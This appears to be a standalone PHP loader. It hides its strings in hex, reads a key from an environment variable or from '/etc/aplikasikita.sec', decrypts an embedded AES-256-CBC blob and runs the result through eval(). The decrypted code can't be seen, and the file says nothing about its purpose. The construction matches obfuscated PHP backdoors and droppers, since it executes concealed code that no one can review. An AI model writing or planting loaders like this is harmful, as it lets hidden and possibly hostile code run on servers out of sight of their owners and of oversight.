<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('v8qQkUaOgOhUmswoh3EfOQ==');

$c=base64_decode(

'q/o/X5oulBTT5A4TDnsDWB0zazC2ro4WTDg7YssMdwSe3Ih/3X/dMnVBCyZ/kpvFRzEqz6vGOY+I' .
't/R8xta6Za9h/NC+8mQO9uWb3dIE7RlT/HtDUXd6mEfV/M+c8GP8z84G8c1SAs3K5Yn2C7qAMxlb' .
'B86UK1YvWqUu3c0x3igpFW3+0EPqDn4xMbGOT3QcvSWHgDNgowA3g3jEy2e4uc7GcV6oVqJIax6N' .
'S5O3iQ0DOEXmjeo/obToy63dxtdpx/zdmTBpP3ZH6zKuQhCMAVhQ2eouDv2eYd+bDfout2szcYSM' .
'0EAw1sAZe3/oDq/WVTq/K6xfqD72aEZRVe99+WlzqaRzOw5p+0RA+wrvvvz3/zRk15+wH2RBJw5L' .
'd5h/ntyuynQOUOUN5psaKUt4ag8OXI/Lwu/Re5R+9vnlqidh4lnIzvGHPNS+4ju65Ux9g3qsjLR7' .
'wNyqWCllnZdRHbiB3ZrHhhUPswj4QGVcHZWEdBC54eJD1hKVURxItAGpGZYC0yEGEH/feUzkGrmt' .
'RiNlcaIYoXwzVJoy7XdCPAHZ1iypxOAIQus/FPmcQHekU/TCdpsXKeWpGLOpsUyRFDDWrY4epX5w' .
'sfmmpDorikiex6fXaumufPa22n6LvGTI7bC03doENowTFnfH3un22LIW0jMMmqRBpq0U2RizGIV+' .
'RLLY873Tn0ooEzltqUBM49D8jQn8mWcdpOM/DwJ60UQOloTCg5LOhkJRgwWgVBXMaLX2EctFwwnf' .
'OzxIkY3+99sMzX0F3wmUyQRYhhlO3+tF2nkZrtVNsKGLYtUmhQuPZRa18FJwgUpi9gA8moK0+Sib' .
'XRaNn3zBCwn0xVgpWaJ9BiwN1Jty1OASaFPGu20WxBdxgUbgC2McAFatr/KcRb3Po/+L1+D1dPOW' .
'bXVg5he5dD0sBbl4CfBIMrjrHn5T+Ep7k2jevflo6Y5p3jxB8MHIt8YaHrKoknZ/Y2uI+D779tad' .
'UUXjNU4xSiZ9XB6o0QEVK3iGrg2dUdZ0UVa6faHPYj6iqaVh3sZlKMXR/mDfXH2bXdZ9pVPzxG+5' .
'wS2nwgoHeKP4bmrFaw1oh6CRcYO8+8tuzVNTrjrxvaA3O8gIhWvQlYJIz+63qJp12yZRlPS5IJPi' .
'kEmeMdTsQIETQpBPnp4BHk48Uj4fRawB0NvbV0CKpBeKHYstBZ+F0hCBrXMp5IbcF+pa3ePjVNnq' .
'Iro6jhlE3wBMixyHjbla05nJfsMTYow8mSujo21XPbfSuaHoTYTFy+xz/kmvbvXC2bOtvg+znlCz' .
'F8LmL/Ynrb6Hv7hEpzBv4qFuHeD4c1KxEDp97O9Yi/qFSd+EDHFFCSNCFppZrMi2jMjPdx1VEw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

